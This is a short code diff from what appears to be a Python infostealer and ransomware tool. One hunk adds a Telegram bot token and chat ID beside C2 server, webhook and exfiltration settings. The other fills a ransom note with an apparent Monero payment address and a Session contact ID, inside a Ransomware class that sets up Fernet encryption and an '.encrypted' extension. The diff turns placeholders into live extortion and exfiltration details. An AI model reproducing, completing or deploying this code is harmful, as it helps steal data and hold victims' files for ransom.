@@ -1344,8 +1344,8 @@ C2_SERVER = "https://your-c2-server.com"
 BACKUP_C2 = "https://backup-c2-server.com"
 ENCRYPTION_KEY = b'x' * 44
 DISCORD_WEBHOOK = ""
-TELEGRAM_TOKEN = ""
-TELEGRAM_CHAT_ID = ""
+TELEGRAM_TOKEN = " tg_TWFpbi5weToxNzc2ODAyNzk2OmF3mi-b6-V1QsZqoGbKwPw "
+TELEGRAM_CHAT_ID = "-140940492992"
 DROPBOX_TOKEN = ""
 MIN_MINUTES_BETWEEN_EXFIL = 5
 MAX_FILE_SIZE = 10485760
@@ -4158,8 +4158,8 @@ class Ransomware:
     def __init__(self):
         self.extension = ".encrypted"
         self.ransom_note = """YOUR FILES HAVE BEEN ENCRYPTED
-        Send 1 xmr to: YOUR_XMR ADDRESS
-        Email: 428n5oBUQPA1rGPfvFF13f4C4TJd1XsX6EHihdqNxoTnKk8tXGFNsCHS3oketz7YBd1wJga8Q96ikgg4v1Vz7xv7VLMEevN  for decryption"""
+        Send 1 xmr to: 428n5oBUQPA1rGPfvFF13f4C4TJd1XsX6EHihdqNxoTnKk8tXGFNsCHS3oketz7YBd1wJga8Q96ikgg4v1Vz7xv7VLMEevN
+        contact us via session: 0519699e644987af53a06e0f7cfdbf4d9d3efb566ffbf727f13b44280870fd6535    for decryption"""
         self.excluded_dirs = ["Windows", "Program Files", "Program Files (x86)", "System32", "boot"]
         self.key = Fernet.generate_key()
         self.cipher = Fernet(self.key)
